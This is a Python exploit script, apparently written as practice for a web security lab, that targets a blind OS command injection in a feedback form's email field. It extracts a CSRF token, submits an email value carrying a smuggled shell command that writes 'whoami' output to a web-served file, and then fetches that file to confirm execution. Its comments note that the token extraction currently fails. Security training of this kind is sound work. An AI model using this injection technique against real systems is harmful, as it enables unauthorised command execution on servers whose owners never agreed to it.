#!/usr/bin/env python3

import requests
import sys
import urllib3

# Script is currently unsucessfull see comments on lines 24 - 26
# use BeautifulSoup to extract the CSRF from the previou srequest and use it in the current one.
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Run requests through BurpSuite first and app responses will be sent to Burp
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


# Obtaining the csrf token from the GET /feedback request in burp's repeater.
def get_csrf_token(s,url):
    feedback_path = '/feedback/submit'
    r = s.get(url + feedback_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    # the csrf value is found in the response of the GET /feedbak request.
    csrf = soup.find("input")['value']
    return csrf
    # Error: 
    # csrf = soup.find("input")['value']
    # TypeError: 'NoneType' object is not subscriptable

# Write this one second
def exploit_command_injection(s, url):
    """ setting the feedback path, the command injection
        extracting the CSRF token
        setting the values for the data variable
        sending the request to the server
    """
    # the feed back path below taken from the request in repeater.
    submit_feedback_path = '/feedback/submit'
    command_injection = 'test@test.ca & whoami > /var/www/images/output2.txt #'

    # Extract the CSRF token which is taken from the request in Byrp's repeater.
    # line below interfaces with the get_csrf_token() function above.
    csrf_token = get_csrf_token(s, url)

    # seting data variable
    # and sending the requests.
    data = {'csrf': csrf_token, 'name': 'test', 'email': command_injection, 'subject': 'test', 'message': 'test'}
    res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
    print("(+) Verifying if command injection exploit worked...")

    # verify command injection: does the output file exist?
    file_path = '/image?filename=output2.txt'
    res2 = s.get(url + file_path, verify=False, proxies=proxies)

    # A 200 response code means the command injection worked.
    if (res2.status_code == 200):
        print("(+) Command injection successful!")
        print("(+) The following is the content of the command: " + res2.text)
    else:
        print("(-) Command injection was not successful.")


# High level overview.
# Creating the main function first. Says what the script is doing
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Exploiting blind command injection in email field...")

    # Use the session object to persist the session and extract the CSRF token
    # from the feedback page before using it in a page vulnerable to cmd injection.
    s = requests.Session()
    exploit_command_injection(s, url)


if __name__ == "__main__":
    main()


